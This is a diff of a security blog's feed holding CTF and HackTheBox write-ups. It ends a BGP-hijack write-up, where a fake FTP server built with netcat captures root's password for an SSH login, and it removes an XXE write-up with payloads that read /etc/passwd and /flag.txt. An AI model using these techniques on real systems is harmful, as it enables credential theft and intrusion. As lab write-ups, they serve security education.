+&lt;p&gt;The prefix &lt;strong&gt;/25&lt;/strong&gt; is voluntarily more specific than &lt;strong&gt;/24&lt;/strong&gt; so that our route will be given &lt;strong&gt;a higher priority&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;changing-eth2-ip-address&quot;&gt;Changing eth2 ip address&lt;/h4&gt;
+
+&lt;p&gt;Now, we have to &lt;strong&gt;add the ip address of the FTP server to eth2 interface&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip addr add 10.120.15.10/25 dev eth2
+ip addr add 10.120.15.10/25 dev eth2
+root@r1:~# ip a
+ip a
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+12: eth2@if13: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
+       valid_lft forever preferred_lft forever
+    inet 10.120.15.10/25 scope global eth2
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe20:98df/64 scope link
+       valid_lft forever preferred_lft forever
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The Nigerian Prince should now be &lt;strong&gt;redirected to our machine&lt;/strong&gt;. We can verify this by &lt;strong&gt;listening on port 21&lt;/strong&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
+nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
+Listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0.0.0.0] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 0, port 21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+
+
+Connection from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.78.10.2] port 21 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tcp/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; accepted &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 2, sport 44696&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+USER root
+PASV
+QUIT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that the user &lt;strong&gt;root&lt;/strong&gt; is trying to login but it &lt;strong&gt;disconnects instantly&lt;/strong&gt; since &lt;strong&gt;our server is not answering&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;faking-an-ftp-server&quot;&gt;Faking an FTP server&lt;/h3&gt;
+
+&lt;p&gt;There is no need to code something complicated in order to &lt;strong&gt;fake an FTP server&lt;/strong&gt;, it can be very simply done with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;. The &lt;strong&gt;FTP protocol uses raw telnet commands&lt;/strong&gt; so we can fake a server by &lt;strong&gt;typing response codes manually&lt;/strong&gt;. All we have to do is to reply with code &lt;strong&gt;331&lt;/strong&gt; after the user has sent his username. Then, the user will supply his &lt;strong&gt;password in plaintext&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
+nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 21
+Listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0.0.0.0] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 0, port 21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Connection from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.78.10.2] port 21 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tcp/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; accepted &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;family 2, sport 44728&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                          
+USER root
+331 Follow @BoiteAKlou    &lt;span class=&quot;c&quot;&gt;# Typed manually&lt;/span&gt;
+PASS BGPtelc0rout1ng
+
+PASV
+
+QUIT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;retrieving-the-flag&quot;&gt;Retrieving the flag&lt;/h3&gt;
+
+&lt;p&gt;It looks like we have the &lt;strong&gt;root credentials&lt;/strong&gt; of the &lt;strong&gt;real FTP server&lt;/strong&gt;! Let’s verify this.&lt;/p&gt;
+
+&lt;p&gt;After &lt;strong&gt;removing the ip address of the FTP server from eth2&lt;/strong&gt; and resetting the BGP configuration, we are finally able to connect to &lt;strong&gt;the real Carrier machine&lt;/strong&gt; (FTP credentials == SSH credentials).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip addr del 10.120.15.10/25 dev eth2
+root@r1:~# ifdown eth2
+ifdown eth2
+root@r1:~# ifup eth2
+ifup eth2
+root@r1:~# ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.120.15.10
+ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.120.15.10
+PING 10.120.15.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.120.15.10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.120.15.10: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.054 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.120.15.10 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0.054/0.054/0.054/0.000 ms
+root@r1:~# python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+root@r1:~# ssh root@10.120.15.10
+ssh root@10.120.15.10
+root@10.120.15.10&lt;span class=&quot;s1&quot;&gt;'s password: BGPtelc0rout1ng
+
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Mar 17 15:31:44 UTC 2019
+
+  System load:  0.07               Users logged in:       0
+  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
+  Memory usage: 47%                IP address for lxdbr0: 10.99.64.1
+  Swap usage:   1%                 IP address for lxdbr1: 10.120.15.10
+  Processes:    220
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+4 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Sep  5 14:32:15 2018
+root@carrier:~# ls
+ls
+root.txt  secretdata.txt
+root@carrier:~# cat root.txt
+cat root.txt
+283[...]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;final-words&quot;&gt;Final words&lt;/h2&gt;
+
+&lt;p&gt;I would like to thank &lt;strong&gt;snowscan&lt;/strong&gt;, the author of this great box. It’s pretty rare to find network-related boxes because it requires a lot of preparation and materials. However, boxes like this are very realistic and allow us to learn a lot of new skills.&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading this writeup, I hope you’ve enjoyed!&lt;/p&gt;
+
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Carrier was a very interesting box where a web command injection gave access to a BGP router. After some BGP Hijacking magic, it was possible to retrieve the FTP credentials of a rich Nigerian Prince, which allowed us to read the flag stored on this FTP server…</summary></entry><entry><title type="html">35C3 CTF Writeups</title><link href="http://localhost:4000/35C3-CTF-Writeups.html" rel="alternate" type="text/html" title="35C3 CTF Writeups" /><published>2018-12-31T17:00:00+01:00</published><updated>2018-12-31T17:00:00+01:00</updated><id>http://localhost:4000/35C3-CTF-Writeups</id><content type="html" xml:base="http://localhost:4000/35C3-CTF-Writeups.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/ccc-logo.gif&quot; alt=&quot;CCL logo&quot; title=&quot;CCL logo&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This weekend was held the &lt;strong&gt;35th Chaos Communication Congress (35C3)&lt;/strong&gt; as long as its excellent CTF. Hopefully, a Junior CTF was also proposed, which was way more accessible than the main CTF (at least for me :wink:). In this post, you’ll find &lt;span style=&quot;color:green;&quot;&gt;concise writeups&lt;/span&gt; of most of the challenges my team and I solved from both CTFs. &lt;br /&gt;
  &lt;!--excerpt--&gt;&lt;/p&gt;
@@ -1010,7 +2286,7 @@ Please &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;Javascript now, or u
 
 &lt;p&gt;I hope you enjoyed this writeup and see you next time guys!&lt;/p&gt;
 
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hawk has been retired from HackTheBox active machines so here is my writeup explaining how I rooted this machine. In this article, we will crack a salted OpenSSL encrypted file, upload a reverse shell to an instance of Drupal 7 CMS. Then, we will use a SSH port-forwarding trick to access a H2 database console disallowing remote connections and exploit this app to get root on the machine. Enjoy your reading!</summary></entry><entry><title type="html">Linux Privilege Escalation: Abusing shared libraries</title><link href="http://localhost:4000/Abusing-Shared-Libraries.html" rel="alternate" type="text/html" title="Linux Privilege Escalation: Abusing shared libraries" /><published>2018-11-21T13:00:00+01:00</published><updated>2018-11-21T13:00:00+01:00</updated><id>http://localhost:4000/Abusing-Shared-Libraries</id><content type="html" xml:base="http://localhost:4000/Abusing-Shared-Libraries.html">&lt;p&gt;Linux applications often use dynamically linked shared object libraries. These libraries allow code flexbility but they have their drawbacks… &lt;span style=&quot;color:Maroon&quot;&gt;In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways.&lt;/span&gt; Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommandations on how to protect your system against it in the final part of the article.
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hawk has been retired from HackTheBox active machines so here is my writeup explaining how I rooted this machine. In this article, we will crack a salted OpenSSL encrypted file, upload a reverse shell to an instance of Drupal 7 CMS. Then, we will use a SSH port-forwarding trick to access a H2 database console disallowing remote connections and exploit this app to get root on the machine. Enjoy your reading!</summary></entry><entry><title type="html">Linux Privilege Escalation: Abusing shared libraries</title><link href="http://localhost:4000/Abusing-Shared-Libraries.html" rel="alternate" type="text/html" title="Linux Privilege Escalation: Abusing shared libraries" /><published>2018-11-21T13:00:00+01:00</published><updated>2018-11-21T13:00:00+01:00</updated><id>http://localhost:4000/Abusing-Shared-Libraries</id><content type="html" xml:base="http://localhost:4000/Abusing-Shared-Libraries.html">&lt;p&gt;Linux applications often use dynamically linked shared object libraries. These libraries allow code flexibility but they have their drawbacks… &lt;span style=&quot;color:Maroon&quot;&gt;In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways.&lt;/span&gt; Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommendations on how to protect your system against it in the final part of the article.
  &lt;!--excerpt--&gt;&lt;/p&gt;
 
 &lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
@@ -1041,7 +2317,7 @@ Please &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;Javascript now, or u
 
 &lt;h2 id=&quot;shared-libraries-in-short&quot;&gt;Shared Libraries in short&lt;/h2&gt;
 
-&lt;p&gt;A library is &lt;strong&gt;a file containing data or compiled code&lt;/strong&gt; that is used by developpers to avoid re-writing the same pieces of code you use in mutiple programs (modular programming). It can contain classes, methods or data structures and will be linked to the program that will use it at the compilation time.&lt;/p&gt;
+&lt;p&gt;A library is &lt;strong&gt;a file containing data or compiled code&lt;/strong&gt; that is used by developers to avoid re-writing the same pieces of code you use in multiple programs (modular programming). It can contain classes, methods or data structures and will be linked to the program that will use it at the compilation time.&lt;/p&gt;
 
 &lt;p&gt;There are different types of libraries in Linux:&lt;/p&gt;
 &lt;ul&gt;
@@ -1057,7 +2333,7 @@ Please &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;Javascript now, or u
   &lt;li&gt;Dynamic loading (dynamiclly loaded and user under program control).&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;They seem much more attractive because of their dynamic nature. If we manage to &lt;strong&gt;alterate the content of a dynamic library&lt;/strong&gt;, we should be able to control the execution of the calling program and that’s what we want!&lt;/p&gt;
+&lt;p&gt;They seem much more attractive because of their dynamic nature. If we manage to &lt;strong&gt;alter the content of a dynamic library&lt;/strong&gt;, we should be able to control the execution of the calling program and that’s what we want!&lt;/p&gt;
 
 &lt;p&gt;For that reason, we will focus on &lt;strong&gt;dynamic linking&lt;/strong&gt; in this article.&lt;/p&gt;
 
@@ -1353,7 +2629,7 @@ I&lt;span class=&quot;s1&quot;&gt;'m the bad library
 
 &lt;p&gt;More generally, ensure that every action performed by users are executed with the lowest privileges.&lt;/p&gt;
 
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Linux applications often use dynamically linked shared object libraries. These libraries allow code flexbility but they have their drawbacks… In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways. Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommandations on how to protect your system against it in the final part of the article.</summary></entry><entry><title type="html">HackTheBox: Bounty writeup - Metasploit basics</title><link href="http://localhost:4000/HackTheBox-Bounty.html" rel="alternate" type="text/html" title="HackTheBox: Bounty writeup - Metasploit basics" /><published>2018-10-28T22:00:00+01:00</published><updated>2018-10-28T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Bounty</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Bounty.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Linux applications often use dynamically linked shared object libraries. These libraries allow code flexibility but they have their drawbacks… In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways. Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommendations on how to protect your system against it in the final part of the article.</summary></entry><entry><title type="html">HackTheBox: Bounty writeup - Metasploit basics</title><link href="http://localhost:4000/HackTheBox-Bounty.html" rel="alternate" type="text/html" title="HackTheBox: Bounty writeup - Metasploit basics" /><published>2018-10-28T22:00:00+01:00</published><updated>2018-10-28T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Bounty</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Bounty.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/bounty-box.png&quot; alt=&quot;Bounty box&quot; title=&quot;Bounty Box&quot; /&gt;&lt;/p&gt;
 
@@ -2482,152 +3758,4 @@ ndh16_&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;d7817ba3f2cf61f97e73023bf815
 
 &lt;p&gt;Alright, this was the final step! Congratz’ :triangular_flag_on_post:&lt;/p&gt;
 
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A steganographic challenge showing the essential tools for PNG analysis and manipulating encoding bases.</summary></entry><entry><title type="html">XML External Entities: Wonkachall-step1 - NDH16</title><link href="http://localhost:4000/Wonka-chall-step1-NDH16.html" rel="alternate" type="text/html" title="XML External Entities: Wonkachall-step1 - NDH16" /><published>2018-07-03T22:00:00+02:00</published><updated>2018-07-03T22:00:00+02:00</updated><id>http://localhost:4000/Wonka-chall-step1-NDH16</id><content type="html" xml:base="http://localhost:4000/Wonka-chall-step1-NDH16.html">&lt;p&gt;This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.&lt;/p&gt;
-
-&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;
-
-&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
-
-&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#take-my-golden-ticket&quot; id=&quot;markdown-toc-take-my-golden-ticket&quot;&gt;Take my Golden Ticket!&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#thats-not-a-ticket&quot; id=&quot;markdown-toc-thats-not-a-ticket&quot;&gt;That’s not a Ticket&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
-
-&lt;p&gt;We have &lt;a href=&quot;http://willywonka.shop:4242/&quot;&gt;a website&lt;/a&gt; which is actually The Golden Ticket Blackmarket platform. It proposes a list of purchasable golden tickets where each ticket has a bitcoin cost, a name and an address.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/tickets.png&quot; alt=&quot;Wonka Shop screen capture&quot; title=&quot;Willy Wonka Shop&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The challenge statement says that the flag is stored in ““/flags.txt”. The objective is to take control of this website. Hurry up!&lt;/p&gt;
-
-&lt;h2 id=&quot;take-my-golden-ticket&quot;&gt;Take my Golden Ticket!&lt;/h2&gt;
-
-&lt;p&gt;The first reflex to have when you arrive on a website should be to hit “CTRL+U” and dive deep into the source code.
-The vast majority of this website is static at the exception of the “/upload.php” page. We are able to upload a zip archive containing a &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; and a &lt;strong&gt;Ticket&lt;/strong&gt; as shown in the provided example.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/upload.png&quot; alt=&quot;Upload page screen capture&quot; title=&quot;Upload page&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The &lt;strong&gt;Ticket file&lt;/strong&gt; contains a string representing the content of the Golden Ticket and the &lt;strong&gt;MANIFEST.xml&lt;/strong&gt; stores the three variables displayed on the home page for each ticket, as shown below:&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Wait a second… it means that the server is parsing XML files in order to get these values… Very interesting! :smiling_imp:&lt;/p&gt;
-
-&lt;p&gt;Have you ever heard of XML external entities?&lt;/p&gt;
-
-&lt;h2 id=&quot;thats-not-a-ticket&quot;&gt;That’s not a Ticket&lt;/h2&gt;
-
-&lt;p&gt;XML External Entity Processing attack aim at exploiting &lt;strong&gt;weakly configured XML parsers&lt;/strong&gt;. The objective is to reference external entities inside the XML document in order to &lt;strong&gt;access local resources&lt;/strong&gt; or to &lt;strong&gt;execute code remotely&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;Alright, now let’s modify our MANIFEST.xml to detect if the website is vulnerable. I suggest the following payload, supposed to include “/etc/passwd” and to display it in place of the ticket’s address:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then we zip the MANIFEST and the Ticket, we upload it and… :tada:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/etcpasswd.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;/etc/passwd&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Say Hello to the list of users!&lt;/p&gt;
-
-&lt;p&gt;Fine, now we can forge the payload that will allow us to retrieve the flag located under “/flag.txt”. This is basically the same payload as before in which we replace the target file as follows:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;entreprise&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/entreprise&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;prixBTC&amp;gt;&lt;/span&gt;xxx BTC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/prixBTC&amp;gt;&lt;/span&gt;
-	&lt;span class=&quot;nt&quot;&gt;&amp;lt;adresseBTC&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/adresseBTC&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And here comes the reward! :triangular_flag_on_post:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-03/flag.png&quot; alt=&quot;XXE disclosure&quot; title=&quot;Flag&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;You can now read the writeup of Wonkachall-step2 :wink:&lt;/p&gt;
-
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.</summary></entry><entry><title type="html">Data exfiltration with PING: ICMP - NDH16</title><link href="http://localhost:4000/Data-exfiltration-with-PING-ICMP-NDH16.html" rel="alternate" type="text/html" title="Data exfiltration with PING: ICMP - NDH16" /><published>2018-07-02T22:00:00+02:00</published><updated>2018-07-02T22:00:00+02:00</updated><id>http://localhost:4000/Data-exfiltration-with-PING-ICMP-NDH16</id><content type="html" xml:base="http://localhost:4000/Data-exfiltration-with-PING-ICMP-NDH16.html">&lt;p&gt;An interesting forensic challenge covering a famous method of data exfiltration…
- &lt;!--excerpt--&gt;&lt;/p&gt;
-
-&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
-
-&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#pretty-heavy-for-a-ping&quot; id=&quot;markdown-toc-pretty-heavy-for-a-ping&quot;&gt;Pretty heavy for a ping…&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#gimme-your-data&quot; id=&quot;markdown-toc-gimme-your-data&quot;&gt;Gimme your data!&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
-
-&lt;p&gt;We are given &lt;a href=&quot;http://localhost:4000/assets/2018-07-02/analysis.pcap&quot;&gt;a packet capture&lt;/a&gt; showing lots of &lt;strong&gt;Echo Requests / Replies&lt;/strong&gt; between the same two computers and we’re supposed to investigate.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-02/wireshark.png&quot; alt=&quot;Wireshark screen capture&quot; title=&quot;Wireshark&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;pretty-heavy-for-a-ping&quot;&gt;Pretty heavy for a ping…&lt;/h2&gt;
-
